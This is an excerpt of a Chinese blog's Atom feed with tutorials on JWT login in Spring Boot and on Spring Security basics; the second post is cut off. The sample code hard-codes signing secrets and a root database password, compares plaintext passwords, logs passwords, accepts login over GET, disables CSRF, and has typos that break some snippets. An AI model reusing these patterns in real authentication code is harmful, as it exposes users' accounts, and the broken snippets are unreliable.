        &lt;h1 id=&quot;思维导图&quot;&gt;&lt;a href=&quot;#思维导图&quot; class=&quot;headerlink&quot; title=&quot;思维导图&quot;&gt;&lt;/a&gt;思维导图&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;/head-first-netty/D:%5CHugo%5Chugo_0.75.1_Windows-64
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Spring and Jwt</title>
    <link href="https://kayleh.top/spring-and-jwt/"/>
    <id>https://kayleh.top/spring-and-jwt/</id>
    <published>2021-05-23T19:04:21.000Z</published>
    <updated>2021-05-27T07:14:10.581Z</updated>
    
    <content type="html"><![CDATA[<h1 id="使用JWT"><a href="#使用JWT" class="headerlink" title="使用JWT"></a>使用JWT</h1><h2 id="1-引入依赖"><a href="#1-引入依赖" class="headerlink" title="1.引入依赖"></a>1.引入依赖</h2><pre class="line-numbers language-lang-xml"><code class="language-lang-xml"><dependency>            <groupId>com.auth0</groupId>            <artifactId>java-jwt</artifactId>            <version>3.4.0</version>        </dependency><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-生成token"><a href="#2-生成token" class="headerlink" title="2.生成token"></a>2.生成token</h2><pre class="line-numbers language-lang-java"><code class="language-lang-java">public class createToken {    public static void main(String[] args) {        Calendar instance = Calendar.getInstance();        instance.add(Calendar.SECOND, 90);        //生成令牌        String token = JWT.create()                .withClaim("username", "张三")//设置自定义用户名                .withExpiresAt(instance.getTime())//设置过期时间                .sign(Algorithm.HMAC256("token!Q2W#E$RW"));//设置签名保密复杂        //输出令牌        System.out.println("--------token:" + token);    }}------ 生成结果eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdWQiOlsicGhvbmUiLCIxNDMyMzIzNDEzNCJdLCJleHAiOjE1OTU3Mzk0NDIsInVzZXJuYW1lIjoi5byg5LiJIn0.aHmE3RNqvAjFr_dvyn_sD2VJ46P7EGiS5OBMO_TI5jg<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-根据令牌和签名解析数据"><a href="#3-根据令牌和签名解析数据" class="headerlink" title="3.根据令牌和签名解析数据"></a>3.根据令牌和签名解析数据</h2><pre class="line-numbers language-lang-java"><code class="language-lang-java">JWTVerifier jwtVerifier = JWT.require(Algorithm.HMAC256("token!Q2W#E$RW")).build();DecodedJWT decodedJWT = jwtVerifier.verify(token);System.out.println("用户名: " + decodedJWT.getClaim("username").asString());System.out.println("过期时间: "+decodedJWT.getExpiresAt());<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="4-常见异常信息"><a href="#4-常见异常信息" class="headerlink" title="4.常见异常信息"></a>4.常见异常信息</h2><ul><li>SignatureVerificationException: 签名不一致异常</li><li>TokenExpiredException: 令牌过期异常</li><li>AlgorithmMismatchException: 算法不匹配异常</li><li>InvalidClaimException: 失效的payload异常<br><img src="/spring-and-jwt/D:%5CHugo%5Chugo_0.75.1_Windows-64bit%5Cblog%5Ccontent%5Cposts%5Cspring-and-jwt%5C20210426122252495.png" alt="在这里插入图片描述"></li></ul><h1 id="封装工具类"><a href="#封装工具类" class="headerlink" title="封装工具类"></a>封装工具类</h1><pre class="line-numbers language-lang-java"><code class="language-lang-java">public class JWTUtils {    private static String TOKEN = "JokerDJToken";    /**     * 生成token     * @param map  //传入payload     * @return 返回token     */    public static String getToken(Map<String,String> map){        JWTCreator.Builder builder = JWT.create();        map.forEach((k,v)->{            builder.withClaim(k,v);        });        Calendar instance = Calendar.getInstance();        instance.add(Calendar.SECOND,7);        builder.withExpiresAt(instance.getTime());        return builder.sign(Algorithm.HMAC256(TOKEN)).toString();    }    /**     * 验证token     * @param token     * @return     */    public static void verify(String token){        JWT.require(Algorithm.HMAC256(TOKEN)).build().verify(token);    }    /**     * 获取token中payload     * @param token     * @return     */    public static DecodedJWT getToken(String token){        return JWT.require(Algorithm.HMAC256(TOKEN)).build().verify(token);    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="整合springboot"><a href="#整合springboot" class="headerlink" title="整合springboot"></a>整合springboot</h1><h2 id="0-搭建springboot-mybatis-jwt环境"><a href="#0-搭建springboot-mybatis-jwt环境" class="headerlink" title="0.搭建springboot+mybatis+jwt环境"></a>0.搭建springboot+mybatis+jwt环境</h2><ul><li>引入依赖</li><li>编写配置</li></ul><pre class="line-numbers language-lang-xml"><code class="language-lang-xml"><!--引入jwt--><dependency>  <groupId>com.auth0</groupId>  <artifactId>java-jwt</artifactId>  <version>3.4.0</version></dependency><!--引入mybatis--><dependency>  <groupId>org.mybatis.spring.boot</groupId>  <artifactId>mybatis-spring-boot-starter</artifactId>  <version>2.1.3</version></dependency><!--引入lombok--><dependency>  <groupId>org.projectlombok</groupId>  <artifactId>lombok</artifactId>  <version>1.18.12</version></dependency><!--引入druid--><dependency>  <groupId>com.alibaba</groupId>  <artifactId>druid</artifactId>  <version>1.1.19</version></dependency><!--引入mysql--><dependency>  <groupId>mysql</groupId>  <artifactId>mysql-connector-java</artifactId>  <version>5.1.38</version></dependency>------------------server.port=8989spring.application.name=jwtspring.datasource.type=com.alibaba.druid.pool.DruidDataSourcespring.datasource.driver-class-name=com.mysql.jdbc.Driverspring.datasource.url=jdbc:mysql://localhost:3306/jwt?characterEncoding=UTF-8spring.datasource.username=rootspring.datasource.password=rootmybatis.type-aliases-package=com.baizhi.entitymybatis.mapper-locations=classpath:com/baizhi/mapper/*.xmllogging.level.com.baizhi.dao=debug<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="1-开发数据库"><a href="#1-开发数据库" class="headerlink" title="1.开发数据库"></a>1.开发数据库</h2><ul><li>这里采用最简单的表结构验证JWT使用</li></ul><pre class="line-numbers language-lang-sql"><code class="language-lang-sql">DROP TABLE IF EXISTS `user`;CREATE TABLE `user` (  `id` int(11) NOT NULL AUTO_INCREMENT COMMENT '主键',  `name` varchar(80) DEFAULT NULL COMMENT '用户名',  `password` varchar(40) DEFAULT NULL COMMENT '用户密码',  PRIMARY KEY (`id`)) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-开发entity"><a href="#2-开发entity" class="headerlink" title="2.开发entity"></a>2.开发entity</h2><pre class="line-numbers language-lang-java"><code class="language-lang-java">@Data@Accessors(chain=true)public class User {    private String id;    private String name;    private String password;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-开发DAO接口和mapper-xml"><a href="#3-开发DAO接口和mapper-xml" class="headerlink" title="3.开发DAO接口和mapper.xml"></a>3.开发DAO接口和mapper.xml</h2><pre><code>@Mapperpublic interface UserDAO {    User login(User user);}&lt;mapper namespace=&quot;com.baizhi.dao.UserDAO&quot;&gt;    &lt;!--这里就写的简单点了毕竟不是重点--&gt;    &lt;select id=&quot;login&quot; parameterType=&quot;User&quot; resultType=&quot;User&quot;&gt;        select * from user where name=#{name} and password = #{password}    &lt;/select&gt;&lt;/mapper&gt;</code></pre><h2 id="4-开发Service-接口以及实现类"><a href="#4-开发Service-接口以及实现类" class="headerlink" title="4.开发Service 接口以及实现类"></a>4.开发Service 接口以及实现类</h2><pre class="line-numbers language-lang-java"><code class="language-lang-java">public interface UserService {    User login(User user);//登录接口}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>impl</p><pre class="line-numbers language-lang-java"><code class="language-lang-java">@Service@Transactionalpublic class UserServiceImpl implements UserService {    @Autowired    private UserDAO userDAO;    @Override    @Transactional(propagation = Propagation.SUPPORTS)    public User login(User user) {        User userDB = userDAO.login(user);        if(userDB!=null){            return userDB;        }        throw  new RuntimeException("登录失败~~");    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="5-开发controller"><a href="#5-开发controller" class="headerlink" title="5.开发controller"></a>5.开发controller</h2><pre class="line-numbers language-lang-java"><code class="language-lang-java">@RestController@Slf4jpublic class UserController {    @Autowired    private UserService userService;    @GetMapping("/user/login")    public Map<String,Object> login(User user) {        Map<String,Object> result = new HashMap<>();        log.info("用户名: [{}]", user.getName());        log.info("密码: [{}]", user.getPassword());        try {            User userDB = userService.login(user);            Map<String, String> map = new HashMap<>();//用来存放payload            map.put("id",userDB.getId());            map.put("username", userDB.getName());            String token = JWTUtils.getToken(map);            result.put("state",true);            result.put("msg","登录成功!!!");            result.put("token",token); //成功返回token信息        } catch (Exception e) {            e.printStackTrace();            result.put("state","false");            result.put("msg",e.getMessage());        }        return result;    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/spring-and-jwt/D:%5CHugo%5Chugo_0.75.1_Windows-64bit%5Cblog%5Ccontent%5Cposts%5Cspring-and-jwt%5C20210426122931619.png" alt="在这里插入图片描述"></p><h2 id="6-数据库添加测试数据启动项目"><a href="#6-数据库添加测试数据启动项目" class="headerlink" title="6.数据库添加测试数据启动项目"></a>6.数据库添加测试数据启动项目</h2><p><img src="/spring-and-jwt/D:%5CHugo%5Chugo_0.75.1_Windows-64bit%5Cblog%5Ccontent%5Cposts%5Cspring-and-jwt%5C20210426122959260.png" alt="在这里插入图片描述"></p><h2 id="7-通过postman模拟登录失败"><a href="#7-通过postman模拟登录失败" class="headerlink" title="7.通过postman模拟登录失败"></a>7.通过postman模拟登录失败</h2><p><img src="/spring-and-jwt/D:%5CHugo%5Chugo_0.75.1_Windows-64bit%5Cblog%5Ccontent%5Cposts%5Cspring-and-jwt%5C20210426123015114.png" alt="在这里插入图片描述"></p><h2 id="8-通过postman模拟登录成功"><a href="#8-通过postman模拟登录成功" class="headerlink" title="8.通过postman模拟登录成功"></a>8.通过postman模拟登录成功</h2><p><img src="/spring-and-jwt/D:%5CHugo%5Chugo_0.75.1_Windows-64bit%5Cblog%5Ccontent%5Cposts%5Cspring-and-jwt%5C20210426123031980.png" alt="在这里插入图片描述"></p><h2 id="9-编写测试接口"><a href="#9-编写测试接口" class="headerlink" title="9.编写测试接口"></a>9.编写测试接口</h2><pre class="line-numbers language-lang-java"><code class="language-lang-java">@PostMapping("/test/test")public Map<String, Object> test(String token) {  Map<String, Object> map = new HashMap<>();  try {    JWTUtils.verify(token);    map.put("msg", "验证通过~~~");    map.put("state", true);  } catch (TokenExpiredException e) {    map.put("state", false);    map.put("msg", "Token已经过期!!!");  } catch (SignatureVerificationException e){    map.put("state", false);    map.put("msg", "签名错误!!!");  } catch (AlgorithmMismatchException e){    map.put("state", false);    map.put("msg", "加密算法不匹配!!!");  } catch (Exception e) {    e.printStackTrace();    map.put("state", false);    map.put("msg", "无效token~~");  }  return map;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/spring-and-jwt/D:%5CHugo%5Chugo_0.75.1_Windows-64bit%5Cblog%5Ccontent%5Cposts%5Cspring-and-jwt%5C20210426123106916.png" alt="在这里插入图片描述"></p><h2 id="10-通过postman请求接口"><a href="#10-通过postman请求接口" class="headerlink" title="10.通过postman请求接口"></a>10.通过postman请求接口</h2><p><img src="/spring-and-jwt/D:%5CHugo%5Chugo_0.75.1_Windows-64bit%5Cblog%5Ccontent%5Cposts%5Cspring-and-jwt%5C20210426123124603.png" alt="在这里插入图片描述"></p><h2 id="11-问题"><a href="#11-问题" class="headerlink" title="11.问题?"></a>11.问题?</h2><ul><li>使用上述方式每次都要传递token数据,每个方法都需要验证token代码冗余,不够灵活? 如何优化</li><li>使用拦截器进行优化</li></ul><h2 id="12-添加拦截器"><a href="#12-添加拦截器" class="headerlink" title="12. 添加拦截器"></a>12. 添加拦截器</h2><p>新建自定义拦截器MyInterceptor.java 实现HandlerInterceptor接口</p><pre class="line-numbers language-lang-java"><code class="language-lang-java">/** * @Author Joker DJ * @Date 2021/2/25 17:34 * @Version 1.0 */@Slf4j@Configurationpublic class MyInterceptor implements HandlerInterceptor {    @Override    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {        if (HttpMethod.OPTIONS.toString().equals(request.getMethod())) {            System.out.println("OPTIONS请求，放行");return true;        }        String token = request.getHeader("Authorization");        Map<String,Object> map = new HashMap<>();        try {            JWTUtils.verify(token);            return true;        } catch (TokenExpiredException e) {            map.put("state", false);            map.put("msg", "Token已经过期!!!");        } catch (SignatureVerificationException e){            map.put("state", false);            map.put("msg", "签名错误!!!");        } catch (AlgorithmMismatchException e){            map.put("state", false);            map.put("msg", "加密算法不匹配!!!");        } catch (Exception e) {            e.printStackTrace();            map.put("state", false);            map.put("msg", "无效token~~");        }        String json = new ObjectMapper().writeValueAsString(map);        response.setContentType("application/json;charset=UTF-8");        response.getWriter().println(json);        return false;    }    @Override    public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception {    }    @Override    public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception {    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>拦截器WebMvcConfig.java</p><pre class="line-numbers language-lang-java"><code class="language-lang-java">@Configurationpublic class WebMvcConfig implements WebMvcConfigurer {    @Override    public void addInterceptors(InterceptorRegistry registry) {        registry.addInterceptor(new MyInterceptor()).                addPathPatterns("/**").//拦截所有请求                excludePathPatterns("/login").excludePathPatterns("/loginApp");//不拦截放行的请求地址    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="13-登录成功返回token后需要的操作"><a href="#13-登录成功返回token后需要的操作" class="headerlink" title="13. 登录成功返回token后需要的操作"></a>13. 登录成功返回token后需要的操作</h2><h3 id="将token放到axios的header中，每次请求都携带token"><a href="#将token放到axios的header中，每次请求都携带token" class="headerlink" title="将token放到axios的header中，每次请求都携带token"></a>将token放到axios的header中，每次请求都携带token</h3><ol><li><p>返回的token写入localStorage<br>localStorage.setItem(‘authorization’,res.data.token);<br><img src="/spring-and-jwt/D:%5CHugo%5Chugo_0.75.1_Windows-64bit%5Cblog%5Ccontent%5Cposts%5Cspring-and-jwt%5C20210426123635828.png" alt="在这里插入图片描述"></p></li><li><p>配置全局axios访问携带token</p><pre class="line-numbers language-lang-java"><code class="language-lang-java">//自动给同一个vue项目的所有请求添加请求头axios.interceptors.request.use(function (config) {let token = localStorage.getItem('authorization');if (token) { config.headers['Authorization'] = token;}return config;})<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="后台接收token方式"><a href="#后台接收token方式" class="headerlink" title="后台接收token方式"></a>后台接收token方式</h3></li><li><p>获取request对象<br>```java<br>HttpServletRequest request = ((ServletRequestAttributes) RequestContextHolder.getRequestAttributes()).getRequest();</p></li></ol><pre><code>2. 通过request获取token```java String token = request.getHeader(&quot;Authorization&quot;);</code></pre><ol><li><p>解析token</p><pre><code>DecodedJWT jwt = JWTUtils.getToken(token);</code></pre></li><li><p>获取token信息</p><pre><code>String id = jwt.getClaim(&quot;id&quot;).asString();     String username = jwt.getClaim(&quot;username&quot;).asString();     String loginname = jwt.getClaim(&quot;loginname&quot;).asString();     User user = new User();     user.setId(id);     user.setLoginname(loginname);     user.setUsername(username);</code></pre></li></ol><p>全部代码</p><pre><code>        HttpServletRequest request = ((ServletRequestAttributes) RequestContextHolder.getRequestAttributes()).getRequest();        String token = request.getHeader(&quot;Authorization&quot;);        DecodedJWT jwt = JWTUtils.getToken(token);        String id = jwt.getClaim(&quot;id&quot;).asString(); //注意类型asxxx        String username = jwt.getClaim(&quot;username&quot;).asString();        String loginname = jwt.getClaim(&quot;loginname&quot;).asString();        User user = new User();        user.setId(id);        user.setLoginname(loginname);        user.setUsername(username);</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;使用JWT&quot;&gt;&lt;a href=&quot;#使用JWT&quot; class=&quot;headerlink&quot; title=&quot;使用JWT&quot;&gt;&lt;/a&gt;使用JWT&lt;/h1&gt;&lt;h2 id=&quot;1-引入依赖&quot;&gt;&lt;a href=&quot;#1-引入依赖&quot; class=&quot;headerlink&quot; title=&quot;1
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>SpringSecurity</title>
    <link href="https://kayleh.top/SpringSecurity/"/>
    <id>https://kayleh.top/SpringSecurity/</id>
    <published>2021-05-20T19:56:08.000Z</published>
    <updated>2021-05-24T03:01:04.772Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SpringBoot整合SpringSecurity"><a href="#SpringBoot整合SpringSecurity" class="headerlink" title="SpringBoot整合SpringSecurity"></a>SpringBoot整合SpringSecurity</h1><blockquote><p><a href="https://www.kuangstudy.com/bbs/1369251751735095298" target="_blank" rel="noopener">https://www.kuangstudy.com/bbs/1369251751735095298</a></p></blockquote><h2 id="Spring-Security课程介绍"><a href="#Spring-Security课程介绍" class="headerlink" title="Spring Security课程介绍"></a>Spring Security课程介绍</h2><h3 id="1-框架概述"><a href="#1-框架概述" class="headerlink" title="1. 框架概述"></a>1. 框架概述</h3><p>📕 Spring Security是基于Spring框架,提供了一套Web应用安全性的完整解决方案。正如你可能知道的关于安全方面的两个主要区域是”认证”和”授权”(或者访问控制),一般来说，Web应用的安全性主要包括用户认证和用户授权两个部分,这两点也是Spring Security的重要核心功能。</p><ol><li>用户认证指的是 : 验证某个用户是否为系统中的合法主体,也就是说用户能否访问该系统。用户认证一般要求用户提供用户名和密码。系统通过校验用户名和密码来完成认证过程。<strong>==通俗点说就是系统认为用户是否能登录。==</strong></li><li>用户授权指的是 : 验证某个用户是否有权限执行某个操作。在同一系统中，不同用户所具有的权限是不同的。比如对一个文件来说，有的用户只能进行读取，而有的用户可以修改。一般来说，系统会为不同的用户分配不同的角色，而每个角色对应一系列的权限。<strong>==通俗点就是系统判断用户是否有权限去做某些事情。==</strong></li></ol><p>📕 Spring Security 特点 :</p><ul><li>和Spring无缝整合。</li><li>全面的权限控制</li><li>专门为Web开发而设计<ul><li>旧版本不能脱离Web环境使用</li><li>新版本对整个框架进行了分层抽取，分成了核心模块和Web模块,单独引入核心模块就可以脱离Web环境。</li></ul></li><li>重量级。</li></ul><h3 id="2-入门案例"><a href="#2-入门案例" class="headerlink" title="2. 入门案例"></a>2. 入门案例</h3><ol><li><p>创建SpringBoot工程,引入相关依赖</p><pre class="line-numbers language-lang-xml"><code class="language-lang-xml"><parent>        <groupId>org.springframework.boot</groupId>        <artifactId>spring-boot-starter-parent</artifactId>        <version>2.2.1.RELEASE</version>        <relativePath/>    </parent>    <dependencies>        <!--Web 依赖-->        <dependency>            <groupId>org.springframework.boot</groupId>            <artifactId>spring-boot-starter-web</artifactId>        </dependency>        <!--Spring Security的相关依赖-->        <dependency>            <groupId>org.springframework.boot</groupId>            <artifactId>spring-boot-starter-security</artifactId>        </dependency>    </dependencies><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>编写Controller进行测试</p><pre class="line-numbers language-lang-java"><code class="language-lang-java">@RestControllerpublic class TestController {    @GetMapping("/add")    public String add() {        return "hello Security";    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="3-SpringSecurity基本原理"><a href="#3-SpringSecurity基本原理" class="headerlink" title="3. SpringSecurity基本原理"></a>3. SpringSecurity基本原理</h3><p>🌳 <strong>Spring Security 本质上是一个过滤器链</strong></p><ul><li>FilterSecurityInterceptor : 是一个方法级的权限过滤器,基本位于过滤链的最底部</li><li>ExceptionTranslationFilter : 是一个异常过滤器,用来处理在认证授权过程中抛出的异常</li><li>UsernamePassowrdAuthenticationFilter : 对/login的post请求做拦截,校验表单中用户名和密码。</li></ul><p>🌳 过滤器是如何进行加载的？</p><p><img src="/SpringSecurity/Hugo\hugo_0.75.1_Windows-64bit\blog\content\posts\SpringSecurity\rikcLoverikcLoveimage-20210206021008467.png" alt="image-20210206021008467"></p><p>🌳 两个重要的接口</p><p> ⚪ UserDetailsService接口详解</p><p> 当什么也没有配置的时候,账号和密码是由SpringSecurity定义生成的。而在实际项目中账号和密码都是从数据库中查出来的,所以我们要通过自定义逻辑控制认证逻辑。<strong>==通俗点来说就是查询用户名和密码的过程==</strong> 如需要自定义逻辑时,只需要实现UserDetailsService接口即可，接口定义如下 :</p><p><img src="/SpringSecurity/Hugo\hugo_0.75.1_Windows-64bit\blog\content\posts\SpringSecurity\rikcLoveimage-20210206022109352.png" alt="image-20210206022109352"></p><p>返回值 UserDetails</p><p>这个类是系统默认的用户主体</p><pre class="line-numbers language-lang-java"><code class="language-lang-java">// 表示获取登录用户的所有权限Collection<? extends GrantedAuthority> getAuthorities();// 表示获取密码String getPassword();// 表示获取用户名String getUsername();// 表示判断用户是否被锁定boolean isAccountNonLocked();// 表示凭证{密码}是否过期boolean isCredentialsNonExpired();// 表示当前用户名是否可用boolean isEnabled();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/SpringSecurity/Hugo\hugo_0.75.1_Windows-64bit\blog\content\posts\SpringSecurity\rikcLoverikcLoveimage-20210206023136065.png" alt="image-20210206023135919"></p><p> ⚪ PasswordEncoder 接口讲解</p><p> 数据加密的接口,用于返回User对象里面密码加密</p><pre class="line-numbers language-lang-java"><code class="language-lang-java">// 表示把参数按照特定的解析规则进行解析String encode(CharSequence rawPassword);// 表示验证从存储中获取的编码密码与编码后提交的原始密码是否匹配。如果密码匹配,则返回true;如果不匹配,则返回false。第一个参数表示需要被解析的密码。第二个参数表示存储的密码。boolean matches(CharSequence rawPassowrd,String encodePassword);// 表示如果解析的密码能够再次进行解析且达到更安全的结果则返回true,否则返回false。默认返回falsedefault boolean upgradeEncoding(String encodePassowrd);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> ⚪ BCryptPasswordEncoder</p><p> BCryptPasswordEncoder是Spring Security官方推荐的密码解析器,平时多使用这个解析器</p><p> BCryptPasswordEncoder是对bcrypt强散列方法的具体实现。是基于Hash算法实现的单向加密。可以通过strength控制加密强度,默认为10。</p><pre class="line-numbers language-lang-java"><code class="language-lang-java">@Testpublic void test01(){    //创建密码解析器    BCryptPasswordEncoder bCryptPasswordEncoder=new BCryptPasswrodEncoder();    //对密码进行加密    String password=bCryptPasswordEncoder.encode("123456");    //打印加密后的数据    System.out.println("加密之后的数据:"+password);    //判断原字符加密后和加密之前是否匹配    boolean result=bCryptPasswordEncoder.matches("123456",password);}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-用户认证"><a href="#4-用户认证" class="headerlink" title="4. 用户认证"></a>4. 用户认证</h3><ol><li><p>设置登录的用户名和密码</p><ul><li><p>第一种方式 : 通过配置文件配置</p><pre class="line-numbers language-lang-properties"><code class="language-lang-properties">spring.security.user.name=rikcspring.security.user.password=123456<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>第二种方式 :通过配置类</p><pre class="line-numbers language-lang-java"><code class="language-lang-java">package com.wisedu.securitydemo1.config;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;import org.springframework.security.config.annotation.authentication.builders.AuthenticationManagerBuilder;import org.springframework.security.config.annotation.web.configuration.WebSecurityConfiguration;import org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter;import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;import org.springframework.security.crypto.password.PasswordEncoder;@Configurationpublic class SecurityConfig extends WebSecurityConfigurerAdapter {    @Override    protected void configure(AuthenticationManagerBuilder auth) throws Exception {        BCryptPasswordEncoder bCryptPasswordEncoder=new BCryptPasswordEncoder();        String password=bCryptPasswordEncoder.encode("123456");        auth.inMemoryAuthentication().withUser("rikc").password(password).roles("admin");    }    @Bean    public PasswordEncoder password(){        return new BCryptPasswordEncoder();    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>第三种方式 : 自定义编写实现类</p><p>· 第一步 创建配置类,设置使用哪个userDetailsService实现类</p><pre class="line-numbers language-lang-java"><code class="language-lang-java">@Configurationpublic class SecurityConfig1 extends WebSecurityConfigurerAdapter {  @Autowired    private UserDetailsService userDetailsService;  @Override    protected void configure(AuthenticationManagerBuilder auth) throws Exception {        auth.userDetailsService(userDetailsService).passwordEncoder(password());    }    @Bean    public PasswordEncoder password(){        return new BCryptPasswordEncoder();    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>· 第二步 编写实现类,返回User对象,User对象有用户名密码和操作权限</p><pre class="line-numbers language-lang-java"><code class="language-lang-java">@Service("userDetailsService")public class MyUserDetailsServie implements UserDetailsService {    @Override    public UserDetails loadUserByUsername(String s) throws UsernameNotFoundException {        List<GrantedAuthority> auths= AuthorityUtils.commaSeparatedStringToAuthorityList("role");        return new User("rikc",new BCryptPasswordEncoder().encode("123"),auths);    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p>查询数据库完成认证</p><p>这是基于(1)里面的第三种自定义编写实现类通过查询数据库完成认证操作</p><p>📕 导入相关依赖</p><pre class="line-numbers language-lang-xml"><code class="language-lang-xml"><dependency>    <groupId>com.baomidou</groupId> <artifactId>mybatis-plus-boot-starter</artifactId>    <version>3.0.5</version></dependency><dependency>    <groupId>mysql</groupId>    <artifactId>mysql-connection-java</artifactId></dependency><dependecy>    <groupId>org.projectlombok</groupId>    <artifactId>lombok</artifactId></dependecy><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>📕 制作实体类</p><pre class="line-numbers language-lang-java"><code class="language-lang-java">@Datapublic class User{    private Integer id;    private String username;    private String password}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>📕 整合mapper,创建接口，操作数据库查询</p></li></ol><h3 id="5-自定义用户登录界面"><a href="#5-自定义用户登录界面" class="headerlink" title="5. 自定义用户登录界面"></a>5. 自定义用户登录界面</h3><ol><li><p>配置类中实现相关的配置</p><pre class="line-numbers language-lang-java"><code class="language-lang-java">@Configurationpublic class SecurityConfig1 extends WebSecurityConfigurerAdapter {    @Autowired    private UserDetailsService userDetailsService;    @Override    protected void configure(AuthenticationManagerBuilder auth) throws Exception {        auth.userDetailsService(userDetailsService).passwordEncoder(password());    }    @Bean    public PasswordEncoder password(){        return new BCryptPasswordEncoder();    }    /**    *自定义登录页面        */    @Override    protected void configure(HttpSecurity http) throws Exception {        http.formLogin()    //自定义编写登录页面            .loginPage("/login.html")   //登录页面设置            .loginProcessingUrl("/user/login")     //登录访问Controller路径            .defaultSuccessUrl("/test/index").permitAll()   //登陆成功以后,跳转路径            .and().authorizeRequests()                .antMatchers("/","/test/hello","/user/login").permitAll()//设置哪些路径可以直接访问不需要登录认证            .anyRequest().authenticated()                .and().csrf().disable();//关闭csrf防护    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="6-用户授权-基于角色或权限进行访问控制"><a href="#6-用户授权-基于角色或权限进行访问控制" class="headerlink" title="6. 